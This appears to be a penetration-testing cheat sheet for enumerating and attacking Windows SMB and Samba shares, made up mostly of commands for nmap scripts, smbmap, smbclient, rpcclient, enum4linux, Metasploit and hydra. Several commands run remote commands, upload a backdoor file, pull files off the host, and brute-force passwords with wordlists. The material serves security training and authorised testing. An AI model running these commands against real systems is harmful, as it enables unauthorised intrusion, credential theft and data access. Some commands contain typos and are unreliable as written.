# SMB

SMB is windows implementation of a file share. The common name for implementing SMB is CIFS, Common Internet File System. SMB stands for **Server Message Block** and it basically works the same as any CIFS would. **135, 139, 445** is common to see open on windows machines. 445 is SMB or CIFS operate on. 139 is netbios, it usually sets up the session for SMB. SMB also has a Linux variation called Samba and it works on the mainly on the same port, **445**.

Everything we find should be written down in a document and potentially dangerous information should be included in the report.

# Cheat Sheet

As always `export ip=192.168.1.1` or whatever your target IP it is so we can call it through `$ip`

### Mounting and deleting a drive on windows through powershell

```bash
## Mounting
net_use <: \\ip\c$ PASSWORD /user:administrator
## Deleting
net_use * /delete
```

## Nmap scripts

```bash
##Some SMB shares have some ports open on UDP, run this to check the top 25 ports UDP.
nmap $ip -sU --top-port 25 --open

##Identify protocols and dialects
nmap $ip -p 445 --script smb-protocols

##Check what security mode the server is running
nmap $ip -p 445 --script smb-security-mode

##Check what sessions are available on the service
nmap $ip -p 445 --script smb-enum-sessions

**##Passing arguments to nmap scripts is done via  --script-args arg1=val1,arg2=val2 etc.**
##If you find some credentials we can run scripts as a user.
nmap $ip -p 445 --script smb-enum-sessions **--script-args smbusername=username,smbpassword=password**

##Enumerating shares
nmap $ip -p 445 --script smb-enum-shares

##Enumerating users
nmap $ip -p 445 --script smb-enum-users

##Getting the server stats
nmap $ip -p 445 --script smb-server-stats

##Getting the security groups
nmap $ip -p 445 --script smb-enum-groups

##Getting what services are running
nmap $ip -p 445 --script smb-enum-services

##Running a big freaking script which does everything and puts it in a textfile.
nmap 10.2.17.87 -p 445 --script smb-protocols,smb-security-mode,smb-enum-sessions,smb-enum-shares,smb-ls,smb-server-stats,smb-enum-domains,smb-enum-users,smb-enum-groups,smb-enum-services --script-args smbusername=user,smbpassword=password -oN nmapSMB.txt
```

## SMBMap

```bash
##Discovering what shared folder and drives are available
smbmap -u guest -p "" -d . -H $ip ##Returns access as guest

##We can do this as an authorized user aswel
smbmap -u administrator -p password -d . -H $ip

##Remote code execution via an authorized user
smbmap -u administrator -p password -d . -H $ip -x 'ipconfig'

##Listing drives on a host
smbmap -u administrator -p password -H $ip -L

##Listing contents of a specific drive 
smbmap -u administrator -p password -H $ip -r 'C$'

##Uploading a file (backdoor in this instance)
smbmap -u administrator -p password -H $ip --upload 'location/of/backdoor.file' 'C$\placement\of\file'

##Downloading files from the server
smbmap -u administrator -p password -H $ip --download 'C$\file\to\download.file'
```

## Samba

```bash
##Query using nmblookup
nmblookup -A $ip

##We can use smbclient to connect to any SMB server
smbclient //$ip/SHARE -N

smbclient -L $ip -N #Getting the description from the server using null session

##Connecting to SMB using rpcclient
rpcclient -U "" -N $ip #N is nopass (null session)

##If we are connected in rpcclient we can type this to get information about the server
rpcclient> **srvinfo**

##We can also enumerate users while connected
rpcclient> **enumdomusers**

##Getting SIDs from a specific user
rpcclient> **lookupnames admin** 
```

## Enum4linux

`enum4linux` is an excellent tool for enumeration. It will run everything if nothing is specified

```bash
##Getting the OS version
enum4linux -o $ip

##Enumerating users
enum4linux -U $ip

##Enumerating groups
enum4linux -G $ip

##Getting printer information
enum4linux -i $ip

##Get SIDs
enum4linux -r -u "admin" -p "password" $ip
```

## Metasploit SMB enumeration

```bash
##Setting global variables
setg RHOSTS = 192.168.1.1

##Getting global variable when you have a loaded module
get RHOSTS

##Enumerates the version
use auxiliary/scanner/smb/smb_version

##Checking protocols
use auxiliary/scanner/smb/smb2

##Listing all users
use auxiliary/scanner/smb/smb_enumusers

##Brute-force with metasploit
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/sjare/wordlists/rockyou.txt
set SMBUser username

##Getting named pipes
use auxiliary/scanner/smb/pipe_auditor
set smbuser username
set smbpass password
set RHOST $ip
```

### Dictionary attacks

```bash
##Brute-force with hydra
hydra -l admin -P /usr/share/wordlist/rockhyou.txt $ip smb
```